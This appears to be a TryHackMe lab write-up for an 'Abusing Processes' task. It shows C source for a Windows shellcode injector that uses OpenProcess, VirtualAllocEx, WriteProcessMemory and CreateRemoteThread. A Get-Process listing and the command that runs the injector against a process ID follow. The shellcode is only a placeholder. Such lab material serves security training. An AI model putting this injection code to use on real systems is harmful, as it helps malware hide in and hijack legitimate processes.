
![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Abusing%20Processes%20pt1.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Abusing%20Processes%20pt2.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Abusing%20Processes%20pt3.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Abusing%20Processes%20pt4.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Abusing%20Processes%20pt5.png)


```C
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = "3484";

int main(int argc, char *argv[]) {
    HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (atoi(argv[1])));
    PVOID b_shellcode = VirtualAllocEx(h_process, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(h_process, b_shellcode, shellcode, sizeof shellcode, NULL);
    HANDLE h_thread = CreateRemoteThread(h_process, NULL, 0, (LPTHREAD_START_ROUTINE)b_shellcode, NULL, 0, NULL);
}
```
```PowerShell
PS C:\Users\THM-Attacker> Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    138       9    14984      14532              2784   0 amazon-ssm-agent
    238      15     5240      18740       0.08   5024   2 ApplicationFrameHost
     83       5      848       3784              3268   0 CompatTelRunner
    151       9     6612      12504              2680   0 conhost
    151       9     6600      12508              3548   0 conhost
    255      13     4648      17904       0.30   3864   2 conhost
    353      13     2168       5168               564   0 csrss
    161       9     1664       4756               632   1 csrss
    318      13     2208       5388               840   2 csrss
    371      15     3624      15364       0.41   3360   2 ctfmon
    233      16     3440      13232       0.17   4888   2 dllhost
    541      22    16308      38644               504   1 dwm
    618      31    16236      43736               556   2 dwm
   1762      71    31772      97144       3.50   4908   2 explorer
     49       7     2008       5968               492   2 fontdrvhost
     49       6     1424       3732               900   0 fontdrvhost
     49       6     1636       4272               908   1 fontdrvhost
    196      11     1748        100              4060   0 GoogleCrashHandler
    173       9     1832          8              3236   0 GoogleCrashHandler64
    236      14     2352        168              3280   0 GoogleUpdate
      0       0       56          8                 0   0 Idle
     91       7     1176       5080              2060   0 LiteAgent
    459      25    10972      43388              2400   1 LogonUI
   1049      22     5128      15180               776   0 lsass
    222      13     2904      10140              3036   0 msdtc
    531      70   179612     106668               804   0 MsMpEng
    260      14     2776      17912       0.14   3536   2 notepad
    661      29    63960      74736       1.66   4036   2 powershell
    319      13     2536      11488       0.23   2640   2 rdpclip
      0      13      440      11708                68   0 Registry
    474      23     9192      30256       1.95   2268   2 RuntimeBroker
    207      11     2164      11620       0.06   3844   2 RuntimeBroker
    265      14     3448      18584       0.09   3928   2 RuntimeBroker
   1146      74    82960     152664       1.88   4440   2 SearchUI
    312      11     3388       7676               764   0 services
    714      29    15092      52348       0.36   3632   2 ShellExperienceHost
    468      17     5060      25172       1.03   3088   2 sihost
    315      20     7752      22936       0.22   4232   2 smartscreen
     56       3      532       1240               412   0 smss
    481      23     5864      16608              2040   0 spoolsv
    157      10    15008      17244              2128   0 ssm-agent-worker
   1830     100    42328      75228               628   0 svchost
    848      27    26792      39508               844   0 svchost
    870      23     7352      24488               880   0 svchost
    747      17     5124      11460               972   0 svchost
    719      34    13168      24696               988   0 svchost
    631      20    17212      28644              1152   0 svchost
    623      31     8832      25108              1196   0 svchost
    693      38     8160      22560              1260   0 svchost
    313      11     2072       8964              1268   0 svchost
    371      16    11724      12768              1276   0 svchost
    201      10     4160      13216              1444   0 svchost
    398      32     8864      17756              1460   0 svchost
    200      11     1564       7176              1624   0 svchost
    223      10     1920       7464              1720   0 svchost
    203      10     2064       8196              2160   0 svchost
    462      20     6628      29948       0.44   3176   2 svchost
    145       8     1500       7272              3348   0 svchost
    185      11     3912      11768              4792   0 svchost
    386      16     5488      15508              2140   0 Sysmon
   2008       0      192        156                 4   0 System
    313      13     4300      17728       0.11   2800   2 taskhostw
    243      24     4932      14616       0.19   3200   2 taskhostw
    126       7     1288       6620              3068   0 unsecapp
    179      11     1572       6896               652   0 wininit
    250      12     2616      15364               724   1 winlogon
    290      12     2660       9896              1336   2 winlogon
    194      12     3080       9432              2412   0 WmiPrvSE
```

```PowerShell
PS C:\Users\THM-Attacker> cd .\Desktop\Injectors\
```
```PowerShell
PS C:\Users\THM-Attacker\Desktop\Injectors> .\shellcode-injector.exe 4968
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Abusing%20Processes%20pt6.png)


**TASK COMPLETED!**


